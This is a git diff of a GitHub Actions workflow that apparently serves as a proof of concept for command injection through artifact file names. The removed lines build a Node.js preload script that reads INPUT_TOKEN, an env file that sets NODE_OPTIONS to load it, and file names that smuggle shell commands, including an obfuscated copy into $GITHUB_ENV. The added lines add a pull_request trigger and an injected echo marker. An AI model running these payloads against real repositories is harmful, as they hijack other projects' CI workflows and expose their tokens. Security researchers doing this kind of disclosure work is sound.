@@ -1,6 +1,7 @@
 name: Test
 
 on:
+  pull_request:
   push:
     branches: [main]
   workflow_dispatch:
@@ -14,23 +15,13 @@ jobs:
     steps:
       - name: Build artifact with attacker-controlled file names and contents
         run: |
-          mkdir -p content
-          cd content
-          printf 'RCE_PROOF: normal artifact content\n' > summary.txt
-          printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > env.txt
-          printf 'DECOY\n' > x.txt
-          cat > p.js <<'JS'
-          const fs = require('fs');
-          const t = process.env.INPUT_TOKEN || '';
-          const s = 'PRELOAD_RAN token_len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?');
-          try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/s', s + '\n'); } catch (e) {}
-          console.log(s);
-          JS
-          touch 'x$(id).txt'
-          touch "x\$(cp\${IFS}\$(printf\${IFS}'\\057')tmp\$(printf\${IFS}'\\057')content\$(printf\${IFS}'\\057')content\$(printf\${IFS}'\\057')env.txt\${IFS}\$GITHUB_ENV).txt"
-          ls -la
+          mkdir -p /tmp/content
+          printf 'hello from attacker PR\n' > /tmp/content/summary.txt
+          printf '%s\n' '${{ github.event.number }}' > /tmp/content/pr_number.txt
+          printf 'x\n' > '/tmp/content/x;echo${IFS}INJECTED_MARKER_OK;true;#z.txt'
+          ls -la /tmp/content
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: content
-          path: content
+          name: content-poc
+          path: /tmp/content
